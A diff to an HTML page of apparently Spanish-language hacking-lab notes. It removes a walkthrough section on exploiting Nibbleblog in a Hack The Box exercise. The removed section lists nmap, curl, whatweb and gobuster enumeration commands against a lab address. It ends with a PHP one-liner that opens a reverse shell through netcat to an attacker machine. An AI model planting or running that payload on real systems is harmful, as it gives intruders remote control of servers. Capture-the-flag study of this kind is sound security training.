@@ -29,28 +29,8 @@
             <ul>
                 <li><a href="#htb-nibbleblog">HTB - Explotación de Nibbleblog</a></li>
             </ul>
-        </section>
-
-        <section id="htb-nibbleblog" class="ejercicio">
-            <h2>HTB - Explotación de Nibbleblog</h2>
-            <button class="toggle-btn">Mostrar/Ocultar detalles</button>
-            <div class="contenido">
-                <h3>Exención de responsabilidad</h3>
-                <p>Este contenido tiene fines educativos y debe utilizarse en entornos controlados.</p>
-                <h3>Fase I: Enumeración y Acceso</h3>
-                <pre><code>nmap -sV --open -oA Upload_php_initial_scan -n -Pn -sS -v 10.129.168.126</code></pre>
-                <h4>Verificación de la web con cURL</h4>
-                <pre><code>curl http://10.129.168.126:80</code></pre>
-                <h4>Identificación de tecnologías con WhatWeb</h4>
-                <pre><code>whatweb http://10.129.168.126:80/nibbleblog</code></pre>
-                <h4>Enumeración de directorios con Gobuster</h4>
-                <pre><code>gobuster dir -u http://10.129.168.126:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30</code></pre>
-                <h4>Obtención de una Shell Reversa</h4>
-                <pre><code>
-<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1234 >/tmp/f"); ?>
-               
-            </div>
-        </section>
+        </section>               
+    
     </main>
 
     <footer>
